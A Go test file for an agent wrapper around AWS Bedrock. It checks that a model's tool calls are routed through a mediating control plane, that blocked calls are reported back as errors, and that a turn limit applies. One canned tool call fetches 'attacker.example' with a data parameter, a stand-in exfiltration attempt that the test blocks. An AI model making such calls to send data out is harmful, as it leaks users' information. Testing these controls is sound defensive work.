package agent

import (
	"context"
	"errors"
	"testing"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/bedrockruntime"
	"github.com/aws/aws-sdk-go-v2/service/bedrockruntime/document"
	"github.com/aws/aws-sdk-go-v2/service/bedrockruntime/types"

	"github.com/miracaral/vaigil/internal/taint"
)

// fakeBedrock replays canned model replies and records what it was sent.
// No network call is made.
type fakeBedrock struct {
	replies []*bedrockruntime.ConverseOutput
	inputs  []*bedrockruntime.ConverseInput
}

func (f *fakeBedrock) Converse(_ context.Context, in *bedrockruntime.ConverseInput, _ ...func(*bedrockruntime.Options)) (*bedrockruntime.ConverseOutput, error) {
	f.inputs = append(f.inputs, in)
	if len(f.replies) == 0 {
		return nil, errors.New("no more replies")
	}
	r := f.replies[0]
	f.replies = f.replies[1:]
	return r, nil
}

func toolUse(id, name string, args map[string]any) *bedrockruntime.ConverseOutput {
	return &bedrockruntime.ConverseOutput{
		StopReason: types.StopReasonToolUse,
		Output: &types.ConverseOutputMemberMessage{Value: types.Message{
			Role: types.ConversationRoleAssistant,
			Content: []types.ContentBlock{&types.ContentBlockMemberToolUse{Value: types.ToolUseBlock{
				ToolUseId: aws.String(id), Name: aws.String(name), Input: document.NewLazyDocument(args),
			}}},
		}},
	}
}

func finalText(s string) *bedrockruntime.ConverseOutput {
	return &bedrockruntime.ConverseOutput{
		StopReason: types.StopReasonEndTurn,
		Output: &types.ConverseOutputMemberMessage{Value: types.Message{
			Role:    types.ConversationRoleAssistant,
			Content: []types.ContentBlock{&types.ContentBlockMemberText{Value: s}},
		}},
	}
}

// recordingCaller stands in for the mediator: it records every call and
// blocks the ones listed in deny.
type recordingCaller struct {
	calls []string
	args  []map[string]string
	deny  map[string]bool
}

func (r *recordingCaller) Call(tool string, args map[string]string) (taint.Value, error) {
	r.calls = append(r.calls, tool)
	r.args = append(r.args, args)
	if r.deny[tool] {
		return taint.Value{}, errors.New("blocked by control plane")
	}
	return taint.FromTool(tool, "From: boss@company.example\nSubject: hi"), nil
}

func lastToolResult(t *testing.T, in *bedrockruntime.ConverseInput) types.ToolResultBlock {
	t.Helper()
	msg := in.Messages[len(in.Messages)-1]
	res, ok := msg.Content[0].(*types.ContentBlockMemberToolResult)
	if !ok {
		t.Fatalf("last message is not a tool result: %#v", msg.Content[0])
	}
	return res.Value
}

// Every tool the model asks for must go through the Caller (the control
// plane), with its arguments intact, and the output must reach the model.
func TestBedrockToolCallsGoThroughCaller(t *testing.T) {
	fake := &fakeBedrock{replies: []*bedrockruntime.ConverseOutput{
		toolUse("t1", "read_inbox", map[string]any{}),
		toolUse("t2", "send_email", map[string]any{"to": "boss@company.example", "body": "summary"}),
		finalText("done"),
	}}
	c := &recordingCaller{}
	answer := (&Bedrock{Client: fake, ModelID: "test-model"}).Run(c, Task{Request: "Summarise my inbox."}, func(string) {})

	if answer != "done" {
		t.Fatalf("answer = %q, want the text of the last message", answer)
	}
	if len(c.calls) != 2 || c.calls[0] != "read_inbox" || c.calls[1] != "send_email" {
		t.Fatalf("calls = %v, want [read_inbox send_email]", c.calls)
	}
	if c.args[1]["to"] != "boss@company.example" || c.args[1]["body"] != "summary" {
		t.Fatalf("send_email args = %v", c.args[1])
	}
	if len(fake.inputs) != 3 || aws.ToString(fake.inputs[0].ModelId) != "test-model" {
		t.Fatalf("want 3 Converse calls with the model id, got %d", len(fake.inputs))
	}
	res := lastToolResult(t, fake.inputs[1])
	if aws.ToString(res.ToolUseId) != "t1" || res.Status == types.ToolResultStatusError {
		t.Fatalf("read_inbox result = %+v", res)
	}
}

// A call the control plane blocks is reported to the model as an error,
// not run and not hidden.
func TestBedrockBlockedCallIsReportedToModel(t *testing.T) {
	fake := &fakeBedrock{replies: []*bedrockruntime.ConverseOutput{
		toolUse("t1", "web_fetch", map[string]any{"url": "https://attacker.example/?d=x"}),
		finalText("ok"),
	}}
	c := &recordingCaller{deny: map[string]bool{"web_fetch": true}}
	(&Bedrock{Client: fake}).Run(c, Task{Request: "x"}, func(string) {})

	res := lastToolResult(t, fake.inputs[1])
	if res.Status != types.ToolResultStatusError {
		t.Fatalf("want error status for a blocked call, got %+v", res)
	}
}

// A model that never stops calling tools is cut off.
func TestBedrockStopsAfterMaxTurns(t *testing.T) {
	var replies []*bedrockruntime.ConverseOutput
	for range maxTurns + 5 {
		replies = append(replies, toolUse("t", "read_inbox", map[string]any{}))
	}
	fake := &fakeBedrock{replies: replies}
	(&Bedrock{Client: fake}).Run(&recordingCaller{}, Task{Request: "x"}, func(string) {})
	if len(fake.inputs) != maxTurns {
		t.Fatalf("want %d Converse calls, got %d", maxTurns, len(fake.inputs))
	}
}
